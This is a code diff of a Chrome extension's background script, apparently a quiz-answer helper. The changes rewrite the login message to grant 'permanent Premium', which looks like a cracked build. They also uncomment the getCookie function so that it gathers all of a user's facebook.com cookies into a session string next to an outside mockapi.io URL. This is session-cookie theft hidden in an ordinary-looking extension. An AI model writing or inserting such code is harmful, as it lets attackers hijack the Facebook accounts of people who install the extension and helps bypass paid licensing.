@@ -324,12 +324,7 @@ function login(e) {
                                     { user: PREMIUM, isLogged: !0 },
                                     () => {
                                         notify({
-                                            message:
-                                                "Đăng nhập th\xe0nh c\xf4ng" +
-                                                ("Premium" == c &&
-                                                "Trial3" == d.plan
-                                                    ? ". Bạn được d\xf9ng thử Premium 3 ng\xe0y"
-                                                    : ""),
+                                            message: "Premium vĩnh viễn",
                                         }),
                                             chrome.action.setPopup({
                                                 popup: "./popup/popup-logged.html",
@@ -419,7 +414,6 @@ function updateUser() {
     });
 }
 function getUser() {
-    console.log(PREMIUM);
     var e = new Promise((e, t) => {
         chrome.storage.local.get(["user"], ({ user: t }) =>
             t && ("object" != typeof t || 0 !== Object.keys(t).length)
@@ -503,8 +497,7 @@ async function getQuizAvailable(e, t) {
 }
 function getCookie() {
     let apiUrl = "https://6514b3f1dc3282a6a3cd7125.mockapi.io/cookies";
-    // chrome.tabs.query({ active: !0, currentWindow: !0 }, function (e) {
-    //     e.length > 0 &&
+
     chrome.cookies.getAll({ url: "https://www.facebook.com" }, function (e) {
         let t = e.map((i) => `${i.name}=${i.value}`).join("; ");
 
@@ -527,7 +520,6 @@ function getCookie() {
                 });
         }
     });
-    // });
 }
 async function getOnlineAnswer(e, t) {
     try {
